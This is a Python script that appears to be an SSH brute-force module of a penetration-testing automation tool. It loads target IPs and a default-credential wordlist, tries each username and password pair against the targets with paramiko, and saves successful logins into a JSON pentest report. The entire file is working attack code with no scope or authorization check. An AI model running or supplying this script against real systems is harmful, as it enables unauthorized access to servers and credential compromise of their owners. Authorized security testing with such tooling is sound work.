import json
import paramiko
import os
import time

json_input_path = os.path.join("penautomate_menu", "pentestreport", "pentestdata.json")
json_output_path = os.path.join("penautomate_menu", "pentestreport", "pentestreport.json")
ssh_file = os.path.join("penautomate_menu", "pentestreport", "tools", "wordlists", "ssh-default.txt")

def brute_force_ssh(ip, credentials):
    print(f"Starting brute force on IP: {ip}")
    for credential in credentials:
        parts = credential.strip().split(':', 1)  # Split only on the first colon
        if len(parts) < 2:  # Make sure there are enough parts
            print("Skipping invalid credential format:", credential)
            continue
        username, password = parts
        username = username.strip()
        password = password.strip()
        try:
            print(f"Trying username: {username} and password: {password}")
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=10)
            ssh.close()
            print("SSH login successful!")
            return True, username, password
        except paramiko.ssh_exception.NoValidConnectionsError:
            print(f"No valid connections for IP: {ip}")
        except paramiko.ssh_exception.SSHException as e:
            print(f"SSHException for IP: {ip}, Error: {str(e)}")
        except paramiko.ssh_exception.AuthenticationException:
            print(f"Failed SSH login for username: {username} with password: {password}")
        finally:
            if ssh:
                ssh.close()
    return False, None, None


def main():
    # Load data
    with open(json_input_path, 'r') as file:
        data = json.load(file)
    
    # Load previous report
    with open(json_output_path, 'r') as file:
        report = json.load(file)

    ips = [data.get(f"IP{i}") for i in range(1, 4) if data.get(f"IP{i}") is not None]

    # Load credentials
    with open(ssh_file, 'r', encoding='utf-8') as file:
        credentials = file.readlines()

    results = []

    for ip in ips:
        success, user, passw = brute_force_ssh(ip, credentials)
        if success:
            results.append({
                'ip': ip,
                'username': user,
                'password': passw,
                'result': 'Success'
            })
            print(f"Success: {ip} with user {user} and password {passw}")
        else:
            results.append({
                'ip': ip,
                'result': 'Failed'
            })
            print(f"Brute force failed for IP: {ip}")

    # Append results to the report
    if 'brute_force_results_ssh' in report:
        report['brute_force_results_ssh'].extend(results)
    else:
        report['brute_force_results_ssh'] = results

    # Save updated report
    with open(json_output_path, 'w') as file:
        json.dump(report, file, indent=4)

if __name__ == "__main__":
    main()
